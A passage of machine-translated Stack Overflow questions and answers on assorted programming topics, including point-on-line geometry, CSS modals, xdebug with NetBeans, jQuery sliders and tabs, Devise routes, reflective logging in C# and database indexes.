            double minx, maxx, miny, maxy;

            minx = Math.Min(pt1.X, pt2.X);
            maxx = Math.Max(pt1.X, pt2.X);

            miny = Math.Min(pt1.Y, pt2.Y);
            maxy = Math.Max(pt1.Y, pt2.Y);

            isValid = (r.X >= minx && r.X <= maxx) && (r.Y >= miny && r.Y <= maxy);

            return isValid ? r : new Point();
        } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-05T19:55:19.623

这是我们在工作中（一家 GIS 公司）使用的一些 javascript 代码，用于在用户想要通过向其添加顶点来分割线的情况下找出鼠标旁边的最近点。应该很容易转移到 C#：

```
function _pointOnLine(line1, line2, pt) {
    var isValid = false;

    var r = new Microsoft.Maps.Location(0, 0);
    if (line1.latitude == line2.latitude && line1.longitude == line2.longitude) line1.latitude -= 0.00001;

    var U = ((pt.latitude - line1.latitude) * (line2.latitude - line1.latitude)) + ((pt.longitude - line1.longitude) * (line2.longitude - line1.longitude));

    var Udenom = Math.pow(line2.latitude - line1.latitude, 2) + Math.pow(line2.longitude - line1.longitude, 2);

    U /= Udenom;

    r.latitude = line1.latitude + (U * (line2.latitude - line1.latitude));
    r.longitude = line1.longitude + (U * (line2.longitude - line1.longitude));

    var minx, maxx, miny, maxy;

    minx = Math.min(line1.latitude, line2.latitude);
    maxx = Math.max(line1.latitude, line2.latitude);

    miny = Math.min(line1.longitude, line2.longitude);
    maxy = Math.max(line1.longitude, line2.longitude);

    isValid = (r.latitude >= minx && r.latitude <= maxx) && (r.longitude >= miny && r.longitude <= maxy);

    return isValid ? r : null;
} 
```

`line1`是一个带有经纬度的点，表示线的端点之一，相当于你的P1。`line2`是另一个端点：P2。`pt`是你的P3。这将返回 P3 垂直通过的线上的点。如果 P3 超过了线的任一端，这将返回 null，这意味着两个端点之一是离 P3 最近的点。

为了清楚起见：

![在此处输入图像描述](../Images/164b0772efeb6c874dd463eacb4ff71a.png)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-05T19:27:03.757

问题是您的 Point 具有 X 和 Y 的整数值，因此您正在进行整数除法。尝试将您的值转换为`float`or `double`，进行计算，然后将它们返回为整数。

请注意，当您这样做时： (P1.Y - P0.Y) * ((PX - P0.X) / (P1.X - P0.X)) 由于 5/2 的结果，您实际上正在失去精度是 2，而不是 2.5，但是当您的值是实数时，5.0/2.0 确实是 2.5。

你应该试试这个：

```
double y1 = P0.Y + (double)(P1.Y - P0.Y) * ((double)(P.X - P0.X) / (double)(P1.X - P0.X));
double x1 = P.X; //these two are implicit casts

double y2 = P.Y;
double x2 = P0.X + (double)(P1.X - P0.X) * ((double)(P.Y - P0.Y) / (double)(P1.Y - P0.Y));

return new Point((x1 + x2) / 2.0, (y1 + y2) / 2.0); //put 2.0 for any case even though x1+x2 is `double` 
```

此外，然后您正在从 double 转换为 int，数字的小数部分会自动切断，因此例如 3.87 将变为 3。如果您可以使用它，那么您的最后一行应该更精确：

```
 return new Point((x1 + x2) / 2.0 + 0.5, (y1 + y2) / 2.0 + 0.5); 
```

这将有效地将双精度值舍入到更接近的整数值。

**编辑：**

但是如果你只是想在两点之间的线上找到点 p3，那么使用这种方法会更容易：

```
public Point lerp(Point P0, Point P1) 
{
      double x = ((double)P0.X + P1.X)/2.0;

      double y = (double)P0.Y + (double)(P1.Y - P0.Y) * ((double)(x - P0.X) / (double)(P1.X - P0.X));
      return new Point(x + 0.5, y + 0.5);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-09-29T14:57:59.113

这是一个老问题，我发现 Corey Ogburn 解决方案非常有用。但我认为发布较少“地图”版本的 javascript 代码可能对其他人有所帮助——我在画布绘图中使用了该代码。

```
export const pointOnLine = (p0, p1, q) => {

  // p0 and p1 define the line segment
  // q is the reference point (aka mouse)
  // returns point on the line closest to px

  if (p0.x == p1.x && p0.y == p1.y) p0.x -= 0.00001;

  const Unumer = ((q.x - p0.x) * (p1.x - p0.x)) + ((q.y - p0.y) * (p1.y - p0.y));
  const Udenom = Math.pow(p1.x - p0.x, 2) + Math.pow(p1.y - p0.y, 2);
  const U = Unumer / Udenom;

  const r = {
    x: p0.x + (U * (p1.x - p0.x)),
    y: p0.y + (U * (p1.y - p0.y))
  }

  const minx = Math.min(p0.x, p1.x);
  const maxx = Math.max(p0.x, p1.x);
  const miny = Math.min(p0.y, p1.y);
  const maxy = Math.max(p0.y, p1.y);

  const isValid = (r.x >= minx && r.x <= maxx) && (r.y >= miny && r.y <= maxy);

  return isValid ? r : null;
} 
```

# facebook-graph-api - 使用 Facebook Graph API 或 FQL 查询 Facebook 用户的最早帖子

> ID：15232366
> 
> 赞同：1
> 
> 时间：2013-03-05T19:23:18.647
> 
> 标签：facebook-graph-api, facebook-fql

我想使用 FQL 或 Graph API 查询 Facebook 用户的最早帖子。最大的问题是默认情况下，Facebook 限制退货商品，这些商品按时间降序排列。

我知道我可以将我的查询限制为`until`，但我不知道输入什么日期，因为我不知道我的用户何时成为 Facebook 会员。我必须像这样搜索：

```
find post until Jan 2006
if null, then find post until Jan 2007
if null, then find post until Jan 2008
.... 
```

我非常讨厌。

有没有更聪明的方法来找出用户最早的帖子？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-06T20:54:49.557

首先，坦率地说，几乎不可能有一个包罗万象的程序来确定用户何时加入 Facebook。我从你过去的问题中知道，你一直在尝试，但很多人在你之前尝试过，这是不可能的。

例如，如果从我加入之日到 1 年后没有人决定在我的墙上写任何东西，会发生什么？该指标现在变得非常不准确，是吗？

任何更聪明的事情都基于可能成立或不成立的假设。

例如

*   假设 1：每个 Facebook 用户都会在他们加入时或附近发布帖子
    *   这给出了基于 A1 的初步猜测
*   假设2：给定A1，在A1返回的unix时间之前发布的朋友在用户墙上的任何帖子都将在日期更早
    *   只要 A1 成立，这将永远成立。

当实际活动和加入日期之间存在一年时，所有这一切都会发生。

您可以通过调用每个项目更少的数据和更多的项目来最小化返回的集合

`/me/feed?fields=created_time&limit=200`

然后你分页直到没有`next`分页参数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-25T18:07:38.983

如果您确实想查找用户何时加入 Facebook，我同意 phwd 的回答。

我能找到的最好方法（这也比通过大量帖子重申要便宜）是访问用户最早的“个人资料图片” *。*这是假设用户在创建帐户后不久会发布个人资料图片。

一旦您可以访问“个人资料图片”相册，您就可以使用`created_time`相册字段（或按 created_time 对个人照片排序个人资料图片）。

即使最早的照片被删除了，用户长时间没有任何头像的可能性有多大？

参考： [https ://developers.facebook.com/docs/graph-api/reference/v2.0/album](https://developers.facebook.com/docs/graph-api/reference/v2.0/album)

# css - 如何制作具有固定标题的灵活高度模态

> ID：15232372
> 
> 赞同：4
> 
> 时间：2013-03-05T19:23:35.850
> 
> 标签：css, modal-dialog

我创建了一个非常简单的模式，它允许内容减少或扩展而不会超出页面 - 始终在顶部和底部留出 10% 的边距。当页面不够高以包含所有模态内容时，整个模态变为可滚动的。

[在这里查看 jsfiddle](http://jsfiddle.net/ZX895/)

是否可以仅使用 CSS 来复制此行为，但只有模态主体可滚动，因此标题始终是固定的。我已经尝试了一些事情，但还没有提出解决方案。使标题`position: fixed`几乎可以工作，我必须将其重新定位在模式框上，然后尝试向正文添加填充，以便内容在标题下可见，这不会使滚动条向下移动。在将一些 js 绑定到窗口调整大小并手动操作正文高度之前，我总是喜欢用尽所有 css 替代品。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-02-17T18:04:16.280

这可能会迟到，但我必须解决固定标题、流体高度、流体宽度的类似问题。

这就是我解决问题的方式：

*   给你的元素一个边框框大小。使用包装器居中并创建边界框。这可以是具有最小宽度和最大宽度+百分比的流体。
*   给你的内容元素一个 auto 的溢出和 100% 的最大高度；
*   使用 box-sizing:border-box;

完整的代码应该是这样的：

```
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}
.modal {
    position: fixed;
    width: 100%;
    height: 100%;
    background-color: rgba(0,0,0,0.8);
}
.wrap {
   position: relative;
   margin: 0 auto;
   display: block;
   width: 90%;
    /* Change the max-width value on a media query breakpoint to make this example more "responsive" */ 
    max-width: 500px;
    height: 90%;
    padding: 30px;
}
.modal header {
    height: 30px;
    padding: 0;
    color: #FFF;
    background-color: #007;
}
.modal .body {
    background-color: #FFF;
    max-height: 100%;
    overflow-y: auto;
} 
```

[http://jsfiddle.net/mariomc/EhR7r/](http://jsfiddle.net/mariomc/EhR7r/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:27:59.123

~~将`max-height`and`overflow-y`设置应用于`.body`而不是`.wrap`...？~~

**编辑1：**

到目前为止，在约束中没有出现任何内容，这表明 JavaScript 或偏离了约束（使用 % 作为标题高度~~或 px 边距~~）。

**编辑2：**

这是一个使用 % 作为标题高度的[初始演示。](http://jsfiddle.net/Matt_Coughlin/Nae9Z/1/)我在页眉标签中添加了一个 px`min-height`以防止页眉在非常小的屏幕上几乎消失，但会牺牲顶部边距（在非常小的屏幕上会减少）。

在 >= 400px 高的屏幕上，它应该完全按照要求工作（40px 标题，高度为 10%）。如果标题的高度降低，它将支持稍小的屏幕（高度为 10% 的 30 像素标题将支持 >= 300 像素的屏幕）。这是一个带有 30px 标题的[演示。](http://jsfiddle.net/Matt_Coughlin/Nae9Z/3/)

这是一个笨拙的解决方案，但它是唯一一个不使用 JavaScript 的解决方案。

另外，请注意，我添加了一个`h2`和一个`.content`标签并将其移动到`padding:10px;`那里，以避免在相同的元素中组合 % 高度和填充（这会导致比指定的 % 值更高的高度）。

# linux - 为什么 netbeans 试图连接到调试代理？

> ID：15232376
> 
> 赞同：1
> 
> 时间：2013-03-05T19:23:50.967
> 
> 标签：linux, netbeans-7, xdebug

我正在尝试在 Debian wheezy 上使用 xdebug 2.2.1 设置 netbeans 7.3。我试图让它在本地主机上工作，它是，只有一个 xdebug 用户从同一台机器连接（最常见的配置）。几个小时后，我有这个：

*   **Xdebug 正在工作**：我执行`debugclient`Xdebug 源中包含的内容，它可以工作（即，当我在 Chrome 地址栏中键入时，`http://localhost/file.php?XDEBUG_SESSION_START=netbeans-xdebug`接收`debugclient`到 XML 响应，我可以与它交互，发送适当的命令。
*   **其他调试客户端可以连接**：我已经检查过它是否适用于 Sublime Text 2（但目前 ST2 不是替代 netbeans 的选项）。
*   **使用调试器时 Netbeans 阻塞**：如果我按 F6（*运行项目*），projet 主页会在 Chrome 上启动，但如果我按 CTRL+F5（*调试项目*），则会出现“*等待连接 (netbeans-xdebug)* ”消息并且在我按下*Finish debug session***之前**，项目主页不会在 Chrome 中启动。然后页面启动，但显然没有调试支持。
**   **Netbeans 似乎正在尝试连接到调试代理**：我已经捕获了端口 9000 数据包，当其他调试器（`debugclient`和`ST2 plugin`）发送 XML 格式的请求时，`netbeans`收到一个奇怪的`proxyinit -p 9000 -k netbeans-xdebug -m 0`字符串。[Proxyinit](http://xdebug.org/docs-dbgp.php#just-in-time-debugging-and-debugger-proxies)似乎是一个信息请求，以便设置多用户系统（但我只需要一个用户）。*

 *这是使用时的截图`debugclient`

![在此处输入图像描述](../Images/41ceb338c2a1839d132b3a37a2ac42ea.png)

使用时也是一样`netbeans`

![在此处输入图像描述](../Images/61d64af89e49406c25eb04fba6dd450e.png)

我有点困惑，因为假设 XML 消息是由 xdebug 不可知地发送的，它没有任何关于谁在等待接收此消息的信息......

所以问题是：为什么 netbeans 或 xdebug（我不知道是谁）试图连接到调试代理？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T20:41:35.420

问题是 Netbeans 默认将项目配置为远程项目。要禁用此功能，您必须转到*项目属性*/*运行配置*/*高级*，在这里您必须删除*Debugger Proxy: Host* and *Port*。单击确定，一切都会按预期工作。*

# jquery - 基于 jquery ui 滑块更改图像

> ID：15232378
> 
> 赞同：0
> 
> 时间：2013-03-05T19:23:56.367
> 
> 标签：jquery, html, css

我想根据滑块值更改滑块 div 内元素的背景图像。这些图像位于 Eclipse 的资源文件夹中...

我有一个名为的 CSS 类`character`，在该类中我有一个`background-image`规则，我想在滑块值更改时更改该规则。

目前，当我滑动滑块时，所有`character`元素背景图像都会发生变化。这不是我想要的行为。我希望每个`character`元素的背景图像仅在其包装滑块更改时更改。

这是我到目前为止的代码：

```
<script>
    $(function() {
        $( ".<%=i%>" ).slider({
            disabled:false,
            animate:"slow",
            range: "min",
            value:6,
            min: 0,
            max: 10,
            step: 1,
            slide: function( event, ui ) {
                $( "#<%=i%>" ).val(  ui.value );
                $( "#hidden<%=i%>" ).val( ui.value );
            }
        });
        $( "#<%=i%>" ).val(  $( ".<%=i%>" ).slider( "value" ) );
        $( "#hidden<%=i%>" ).val(  $( ".<%=i%>" ).slider( "value" ) );
    });
</script>
<script>
    if($( "#hidden<%=i%>" ).val( ui.value )==6)
    {       
        $('.character', this).css("background-image", "url(../images/characters/1.png)");
    }
</script> 
```

有谁看到我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T21:47:36.810

问题是您更改背景的代码位于错误的位置并且语法不正确。

您需要将触发器放在与元素相关联的事件中。现在在您的脚本中，当您尝试更改背景图像时，它正在查看文档。因此`this`，由于上下文是文档，所有`character`元素都将被选中。

如果你这样做了：

```
$(".<%=i%>").slider({
    disabled: false,
    animate: "slow",
    range: "min",
    value: 6,
    min: 0,
    max: 10,
    step: 1,
    slide: function (event, ui) {
        $("#<%=i%>").val(ui.value);
        $("#hidden<%=i%>").val(ui.value);
    },
    change: function(event, ui){
        if(ui.value == 6){
            $('.character', this).css("background-image", "url(../images/characters/1.png)");
        }else{
            $('.character', this).css("background-image", "{some other/default image}");
        }
    }
}); 
```

那么`this`上下文实际上就是sllider div。

[这是我更改背景颜色而不是图像的示例](http://jsfiddle.net/9qjZB/)

# php - PHP：这个语句是如何工作的

> ID：15232381
> 
> 赞同：0
> 
> 时间：2013-03-05T19:24:03.660
> 
> 标签：php

如何评估此语句以产生`234`.

```
echo '3'.(print'2')+3; // output 234. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T19:32:52.667

您正在使用 echo 命令显示字符串。此字符串是字符串“3”的串联，调用 print '2' 的结果加上数字 3。

在连接打印'2'期间评估，因此输出开始。之后打印连接的字符串 '34'，其中 4 是 1 的结果（=true，打印调用的结果）+ 3

文字太多了，但我希望能涵盖所有内容。

# javascript - 如何使用jquery在数组中选择多个输入值

> ID：15232386
> 
> 赞同：0
> 
> 时间：2013-03-05T19:24:19.027
> 
> 标签：javascript, jquery, html, jquery-selectors, css-selectors

我有一个这样的 HTML 文档

```
<div>
     <span>checkbox 1 : </span><input type="checkbox" value="12" />
     <span>checkbox 2 : </span><input type="checkbox" value="23" />
     <span>checkbox 3 : </span><input type="checkbox" value="38" />
     <span>checkbox 4 : </span><input type="checkbox" value="49" />
</div>
<input type="submit" value="Make" onclick="do_it()" /> 
```

我想要一个包含选中复选框输入值的数组。

*例如，如果选中复选框 1 和复选框 3，我需要这个数组 = [12,38]。*

我用 Javascript 和 JQuery 尝试了几个想法，但我无法修复它:(

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T19:26:39.860

```
var arr = $('input[type=checkbox]:checked').map(function(){
       return this.value;
}).get(); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-05T19:35:13.870

另一种选择，但不像 undefined 那样枯燥：

[http://jsfiddle.net/KTR9r/1/](http://jsfiddle.net/KTR9r/1/)

```
<div>
     <span>checkbox 1 : </span><input type="checkbox" value="12" />
     <span>checkbox 2 : </span><input type="checkbox" value="23" />
     <span>checkbox 3 : </span><input type="checkbox" value="38" />
     <span>checkbox 4 : </span><input type="checkbox" value="49" />
</div>
<input id="my_submit" type="submit" value="Make" />

$("#my_submit").click(function() {

    var my_array = [];

    $("input:checkbox" ).each(function() {
        if( $(this).prop('checked') ){
            my_array.push( $(this).val() );
        }
    });    

    console.log(my_array);

}); 
```

# c# - IE 不一致地呈现 JavaScript div

> ID：15232388
> 
> 赞同：0
> 
> 时间：2013-03-05T19:24:32.130
> 
> 标签：c#, javascript, internet-explorer, html

我正在尝试显示一堆渲染为看起来像垂直和水平线的 div。虽然代码在技术上有效，但它并不能始终如一地工作。在第一个页面加载时，可能只显示一行，而在下一个页面加载时可能会显示完全不同的一行，或者它们都会显示。我在 IE8 和 IE9 上用同样的问题测试这个，在这一点上有点迷茫。

我`ScriptManager.RegisterStartupScript(this, GetType(), "linesCode", script, false);`用来注册脚本，但它使用旧`RegisterStartupScript(key, string)`方法做同样的事情。

正在注册的代码，从浏览器的“查看源代码”中提取：

```
<script type="text/javascript">
    $(document).ready(function () {
        drawLineVertical('MainContent_1_ClauseRowDefaultTable', 'MainContent_3_AddRowTable', 2, 30);
        drawLineHorizontal('MainContent_1_ClauseRowDefaultTable', 'MainContent_2_ConditionRowTable', 2, 40);
        drawLineHorizontal('MainContent_1_ClauseRowDefaultTable', 'MainContent_3_AddRowTable', 2, 30);
    });
</script> 
```

正在处理的代码（大部分是在旧博客文章中找到的）：

```
function drawLineVertical(id1, id2, wid, offset) {
    var obj1 = document.getElementById(id1);
    var obj2 = document.getElementById(id2);

    var obj1Pos = GetCoordinates(obj1);
    var obj2Pos = GetCoordinates(obj2);

    var id = 'line_' + new Date().getTime();
    var line = "<div id=\"" + id + "\" class=\"line\"></div>";
    $('body').append(line);
    $('#' + id).css({
        left: obj1Pos.x,
        top: obj1Pos.y,
        height: ((obj2Pos.y - obj1Pos.y) + offset),
        width: wid,
        position: 'absolute',
        background: '#c2c5d1',
        backgroundcolor: '#c2c5d1'
    });
}

function drawLineHorizontal(id1, id2, h, offset) {
    var obj1 = document.getElementById(id1);
    var obj2 = document.getElementById(id2);

    var obj1Pos = GetCoordinates(obj1);
    var obj2Pos = GetCoordinates(obj2);

    var id = 'line_' + new Date().getTime();
    var line = "<div id=\"" + id + "\" class=\"line\"></div>";
    $('body').append(line);
    $('#' + id).css({
        left: obj1Pos.x,
        top: (obj2Pos.y + offset),
        height: h,
        width: obj2Pos.x - obj1Pos.x,
        position: 'absolute',
        background: '#c2c5d1',
        backgroundcolor: '#c2c5d1'
    });
}

function GetCoordinates(obj) {
    var pos = {};
    pos.x = obj.offsetLeft;
    pos.y = obj.offsetTop;
    while (obj.offsetParent) {
        pos.x = pos.x + obj.offsetParent.offsetLeft;
        pos.y = pos.y + obj.offsetParent.offsetTop;
        if (obj == document.getElementsByTagName("body")[0]) {
            break;
        }
        else {
            obj = obj.offsetParent;
        }
    }
    return pos;
} 
```

非常感谢任何输入。

# axapta - 当 Dynamics Ax 2012 客户端连接到 AOS 时会触发什么代码？

> ID：15232389
> 
> 赞同：1
> 
> 时间：2013-03-05T19:24:33.307
> 
> 标签：axapta, dynamics-ax-2012, aot

希望在客户端连接到特定 AOS 时添加一些自定义功能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T22:03:41.830

您需要更加具体，以便 AX 客户端**始终**按照定义连接到 AOS。如果您需要在客户端启动时做一些工作，那么您有`SysStartupCmd`课程。

[http://msdn.microsoft.com/en-us/library/aa569641.aspx](http://msdn.microsoft.com/en-us/library/aa569641.aspx)

# ruby-on-rails - Rails 设计密码编辑不起作用

> ID：15232390
> 
> 赞同：0
> 
> 时间：2013-03-05T19:24:37.927
> 
> 标签：ruby-on-rails, devise, passwords

我在菜单中有以下链接：

```
<li><%= link_to "Change your password", edit_user_registration_path %> 
```

这是我的路线：

```
devise_for :users 
```

单击链接时，我收到以下路由错误：

```
No route matches {:controller=>"devise/admin"} 
```

我不明白我做错了什么。

以下是设计路线：

```
 new_user_session GET    /users/sign_in(.:format)          devise/sessions#new
        user_session POST   /users/sign_in(.:format)          devise/sessions#create
destroy_user_session GET    /users/sign_out(.:format)         devise/sessions#destroy
       user_password POST   /users/password(.:format)         devise/passwords#create
   new_user_password GET    /users/password/new(.:format)     devise/passwords#new
  edit_user_password GET    /users/password/edit(.:format)    devise/passwords#edit
                     PUT    /users/password(.:format)         devise/passwords#update
 cancel_user_registration GET    /users/cancel(.:format)    devise/registrations#cancel
   user_registration POST   /users(.:format)               devise/registrations#create
new_user_registration GET    /users/sign_up(.:format)         devise/registrations#new
edit_user_registration GET    /users/edit(.:format)           devise/registrations#edit
                     PUT    /users(.:format)
                     PUT    /users(.:format)               devise/registrations#update
                     DELETE /users(.:format)            devise/registrations#destroy 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T21:28:12.490

我认为更改密码链接的路径是`edit_password_url`如果我没记错的话。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:57:26.730

在没有看到更多代码的情况下，我能提供的最佳解决方案就是撕掉设计并将其放回原处。只需运行 rails d 命令反转创建设计的生成命令并重新开始。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T22:05:53.900

你需要告诉 Rails 你正在为谁编辑密码

正确的方法是这样的

```
<li><%= link_to "Change your password", edit_user_registration_path(current_user) %> 
```

current_user 是 devise 提供的助手。希望能帮助到你！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-23T07:30:52.007

如果您有一个设计模型**User**，您可以使用此路径路由到更改密码页面：

```
edit_user_registration_path 
```

然后你可以像这样在你的视图中使用它：

```
<%= link_to 'Change Password', edit_user_registration_path %> 
```

# javascript - 如何在 jquery 选项卡中禁用显示效果？

> ID：15232391
> 
> 赞同：0
> 
> 时间：2013-03-05T19:24:39.817
> 
> 标签：javascript, jquery, asp.net, tabs

我已经使用带有 ASP.NET HiddenField 的 jquery 选项卡来保存选定的选项卡。

如果我尝试这个源代码，那么我有自动效果 - 在显示选项卡中淡入。

如何在显示选项卡中删除此效果？

我有以下 javascript 代码：

```
$(function () {
   $("#tabs").tabs({
       show: function() {
          var selectedTab = $('#tabs').tabs('option', 'selected');
          $("#<%= hdnSelectedTab.ClientID %>").val(selectedTab);
          },
       selected: <%= hdnSelectedTab.Value %>
   });
 });

<asp:HiddenField ID="hdnSelectedTab" runat="server" Value="0" /> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:35:09.450

试试这个

```
$( "#tabs" ).tabs({ show: { effect: "none"} }); 
```

您可以从[Jquery UI 文档中获得更多选项。](http://api.jqueryui.com/tabs/#option-show)

# c# - C# 中的递归日志对象属性

> ID：15232402
> 
> 赞同：0
> 
> 时间：2013-03-05T19:25:11.667
> 
> 标签：c#, .net, wcf, recursion

我想记录每个 WCF 参数。我使用参数检查器并创建递归代码来检查所有输入中每个类中的每个属性（我的代码类似于：[How to recursive print the values of an object's properties using reflection](https://stackoverflow.com/questions/6196413/how-to-recursively-print-the-values-of-an-objects-properties-using-reflection)）所以我可以像这样登录文件：

```
MethodName(string="aaa", ComplexClass=[prop="aaa", prop2="bbb"]) 
```

不幸的是，我必须更改我的代码以不记录标有名为 NoLog 的自定义属性的属性。我修改了我的代码以获取每个属性的属性，但是因为每次我检查参数时，我的代码都会变慢。

所以我的问题是：我怎样才能提供缓存？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:39:25.097

有一些类：

```
public class A
{
    public int Id { get; set; }
    public B BValue { get; set; }

    public A()
    {
        this.Id = 1000;
        this.BValue = new B();
    }
}

public class B
{
    public string Name { get; set; }
    public C CValue { get; set; }
    [NoLog]
    public string Secret { get; set; }

    public B()
    {
        this.Name = "Empty Name";
        this.CValue = new C();
    }
}

public class C
{
    public string Description { get; set; }

    public C()
    {
        this.Description = "Empty Description";           
    }
} 
```

和 NoLog 自定义属性：

```
public class NoLogAttribute : Attribute
{

} 
```

根据你的问题，你使用这样的东西来漂亮地打印：

```
public static void PrintProperties(object obj, int indent = 4, char intendCharacter = ' ')
    {
        if (obj == null) return;
        string indentString = new string(intendCharacter, indent);
        Type objType = obj.GetType();
        foreach (var pName in GetPropertiesToLogWithCaching(obj))
        {
            var property = objType.GetProperty(pName);
            object propValue = property.GetValue(obj, null);
            if (property.PropertyType.Assembly == objType.Assembly)
            {
                Console.WriteLine("{0}{1}:", indentString, property.Name);
                PrintProperties(propValue, indent + 2);
            }
            else
            {
                Console.WriteLine("{0}{1}: {2}", indentString, property.Name, propValue);
            }
        }            
    } 
```

我改变了我们访问属性的方式（按名称）并为这两种方法添加了：

```
public static List<string> GetPropertiesToLogWithCaching(object obj)
    {
        List<string> propertiesToLog = new List<string>();
        if (obj != null)
        {
            string key = obj.GetType().FullName;
            propertiesToLog = CacheLayer.Get<List<string>>(key);
            if (propertiesToLog == null)
            {
                propertiesToLog = GetPropertiesToLog(obj);
                CacheLayer.Add<List<string>>(propertiesToLog, key);
            }
        }
        return propertiesToLog;
    }

    public static List<string> GetPropertiesToLog(object obj)
    {
        List<string> propertiesToLog = new List<string>();
        if (obj != null)
        {
            foreach (var p in obj.GetType().GetProperties().Where(prop => !Attribute.IsDefined(prop, typeof(NoLogAttribute))))
            {                   
                propertiesToLog.Add(p.Name);
            }
        }
        return propertiesToLog;
    } 
```

其中 GetPropertiesToLogWithCaching 是 GetPropertiesToLog 的包装器。您可以在这里找到 ChacheLayer 对象[http://www.deanhume.com/home/blogpost/object-caching----net-4/37](http://www.deanhume.com/home/blogpost/object-caching----net-4/37)

现在它是递归的并且具有缓存。正如我在答案的第一个版本中所写。我们的想法是在不测试属性的情况下按名称查询属性名称列表，而不是按名称获取属性作为缓存的键，我们可以使用 obj 类型的 FullName。现在你需要检查它是如何工作的。

# database - 什么是数据库索引？

> ID：15232403
> 
> 赞同：54
> 
> 时间：2013-03-05T19:25:13.510
> 
> 标签：database, indexing

自从我大约 18 个月前开始从事科技工作以来，我就听说过他们。我知道它们可能会提高性能，而且它们似乎是特定于列的——（“我们在 date_of_birth 列上索引用户表”）。

只是想快速了解它们到底是什么，它们的用途以及它们是如何工作的。

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2013-03-06T09:42:41.360

我为此写了一本完整的书！它也可以在网上免费获得：http: [//use-the-index-luke.com/](http://use-the-index-luke.com/)

我试图尽快回答你的问题——这并不是我擅长的。我最后一次尝试，我最终写了一本书......

与表一样，索引由行和列组成，但以逻辑排序的方式存储数据以提高搜索性能。把它想象成一本电话簿（印刷版）。它们通常是排序`last_name`的，`first_name`可能还有其他标准（例如邮政编码）。这种排序可以快速找到特定姓氏的所有条目。如果您也知道名字，您甚至可以非常快速地找到姓/名组合的条目。

但是，如果您只知道名字，电话簿并不能真正帮助您。多列数据库索引也是如此。所以是的，索引可以**潜在地**提高搜索性能。如果您的问题索引错误（例如，按名字搜索时的电话簿），它们可能无用。

您可以在同一个表上但在不同的列上拥有许多索引。因此， , 上的索引与 only 上`last_name`的`first_name`索引不同`first_name`（您需要按名字优化搜索）。

索引保存冗余数据（例如：[聚集索引](http://use-the-index-luke.com/sql/clustering/index-organized-clustered-index)= 电话簿）。它们具有与表中存储的相同信息（例如：[基于函数的索引](http://use-the-index-luke.com/sql/where-clause/functions/case-insensitive-search)），但以排序方式。[对于您执行的每个写入操作（插入/更新/删除](http://use-the-index-luke.com/sql/dml)），数据库会自动维护这种冗余。因此，索引**会降低**写入性能。

除了快速查找数据外，索引还可用于优化[排序操作](http://use-the-index-luke.com/sql/sorting-grouping)（`order by`）并将相关数据物理地紧密排列在一起（[集群](http://use-the-index-luke.com/sql/clustering)）。

为了更好地了解，请查看我的书的完整目录：http: [//use-the-index-luke.com/sql/table-of-contents](http://use-the-index-luke.com/sql/table-of-contents)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-03-05T19:29:55.753

将其视为表格的目录。如果它在那里，数据库知道在哪里看更具体。如果它不存在，则数据库必须搜索所有数据才能找到它。

可以[在此 Wikipedia 文章](http://en.wikipedia.org/wiki/Database_index)中找到更详细的解释。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2013-05-20T16:24:24.800

数据库索引是一种旨在提高查找操作时间复杂度的数据结构。

没有索引的查找是最坏情况下的`O(N)`复杂性。使用索引进行高效查找可以实现对数`O(log(N))`甚至某些架构`O(1)`复杂性。

数据库索引还可以强制执行数据库约束。许多数据库系统在一组列上设置索引，称为`PRIMARY KEY`. 一些数据库系统需要对 a 中的列`FOREIGN KEY`进行索引，以加快操作（插入、更新）。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2013-03-05T19:28:27.813

索引是一种可选结构，与表或表簇相关联，有时可以加快数据访问速度。通过在表的一个或多个列上创建索引，您可以在某些情况下从表中检索一小组随机分布的行。索引是减少磁盘 I/O 的众多方法之一。

如果堆组织表没有索引，则数据库必须执行全表扫描才能找到值。例如，在没有索引的情况下，对 hr.departments 表中位置 2700 的查询要求数据库在每个表块中的每一行中搜索该值。随着数据量的增加，这种方法不能很好地扩展。

[http://docs.oracle.com/cd/E11882_01/server.112/e10713/indexiot.htm](http://docs.oracle.com/cd/E11882_01/server.112/e10713/indexiot.htm)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-03-05T19:35:02.570

它有一个非常相似的线程在[***这里***](https://stackoverflow.com/questions/1108/how-does-database-indexing-work)运行。检查一下，很有帮助。

> 我知道它们可能会提高性能

对，是真的。但是，请记住，有时索引也可能是**性能**不佳的原因。示例：索引数据库的所有列无疑会严重影响性能。

# google-apps-script - 检测用户在谷歌电子表格中插入行或列并在脚本中做出反应

> ID：15232405
> 
> 赞同：15
> 
> 时间：2013-03-05T19:25:19.407
> 
> 标签：google-apps-script, google-sheets, google-apps-script-addon

在 Google Apps 脚本中，基本工具之一是电子表格中的 onEdit 触发器，它使我们能够检测用户何时编辑单元格并对其做出反应。

当用户插入一行或一列时怎么样？有没有办法检测到？

这会触发 onEdit 吗？如果是这样，我想在 ScriptDb 中维护行数或列数的计数，然后每次检查都可以，但是会非常耗时，因为 getMaxRows() 已经很慢了，并且与 ScriptDb 联系是好。

你怎么看 ？

* * *

## 回答 #1

> 赞同：26
